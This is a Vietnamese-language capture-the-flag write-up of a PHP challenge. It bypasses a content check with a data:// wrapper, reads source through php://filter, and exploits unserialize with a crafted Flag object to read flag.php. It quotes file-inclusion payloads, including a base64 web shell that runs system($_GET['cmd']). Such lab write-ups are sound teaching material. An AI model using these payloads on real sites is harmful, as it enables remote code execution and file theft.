Challenge cho ta source code

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

3 biến $file, $text, $password được tạo bằng cách lấy dữ liệu từ các tham số file, text, password được truyền lên bằng method GET.Sau đó là vòng lặp if, đầu tiên nó sẽ kiểm tra $text có tồn tại hay không và hàm file_get_content() sẽ tìm file text với option là “r” có nghĩa là read và check xem nội dung có phải là “welcome to the zjctf” hay không. Và bởi vì ko có file nào tồn tại với nội dung như vậy nên ta sẽ bypass nó qua if bằng data wrapper.

```source:hacktricks
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Ví dụ:

```php
<?php
echo file_get_contents('data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=');
?>
//output: welcome to the zjctf
```

Payload:

`?text=data:text/plan;base64,d2VsY29tZSB0byB0aGUgempjdGY=`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/c2fa6ac7-28b6-434b-93a1-ac9c80a014e8)

Vậy hướng đi đã đúng giờ ta back về đọc lại source để làm tiếp.

```php
if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

Tiếp theo nó sẽ check xem có chữ flag trong $file không, nếu không thì nó sẽ include file, và ở đây được hint là useless.php nên mình sẽ mở file này bằng PHP wrapper.

`?text=data:text/plan;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/convert.base64-encode/resource=useless.php`

Kết quả cho ra 1 dãy base64.Sau đó decode

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

__toString: Phương thức __toString() sẽ được gọi khi chúng ta dùng đối tượng được unserialize() như một string. Và đối tượng được unserialze() ở đây là password, và nó được xem như là 1 string vì dùng hàm echo để print nó ra. Và trong source code này thì phương thức __tostring sẽ dùng hàm file_get_contents để đọc nội dung của biến file. Tasẽ lợi dụng điều này để đọc file flag.php

Payload:

```php
<?php

class Flag{
    public $file="flag.php";
}

$new = new Flag();
$a = serialize($new);
var_dump($a);
?>
```

Output: `O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

Payload: `/?text=data:text/plan;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/fed91652-720d-4d49-967c-60db7705d047)


